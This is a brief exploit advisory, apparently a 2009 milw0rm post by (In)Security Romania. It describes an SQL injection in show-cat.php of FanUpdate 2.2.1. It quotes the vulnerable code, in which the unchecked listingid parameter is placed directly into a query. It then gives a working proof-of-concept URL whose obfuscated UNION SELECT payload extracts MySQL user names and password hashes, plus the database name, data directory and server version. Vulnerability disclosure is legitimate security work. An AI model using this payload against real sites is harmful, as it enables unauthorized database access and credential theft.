@@ -1,0 +1,30 @@
+Author : (In)Security Romania
+
+Website : https://insecurity.ro
+
+Vulnerable script : FanUpdate 2.2.1
+
+
+- Explanation
+
+See show-cat.php file
+
+-----------------------------------------------------------------------------------------------
+if (!isset($listingid)) { exit; }
+
+require_once('blog-config.php');
+require_once('functions.php');
+
+$fu =& FanUpdate::instance();
+$fu->addOptFromDb();
+
+$query = "SELECT * FROM ".$fu->getOpt('catoptions_table')." WHERE cat_id=$listingid LIMIT 1";
+-----------------------------------------------------------------------------------------------
+
+listingid variable not checked,we can inject our maliciouse SQL code.
+
+- PoC
+
+http://website/script/show-cat.php?listingid=nuLL/*pwned*/uNiOn+aLL+seLeCt+0,0,coNcAt_ws(0x3a,user,0x3a,password),coNcAt_ws(0x3a,user(),0x3a,database(),0x3a,@@datadir,0x3a,version()),0,0+frOm+mysql.user--
+
+# milw0rm.com [2009-09-18]
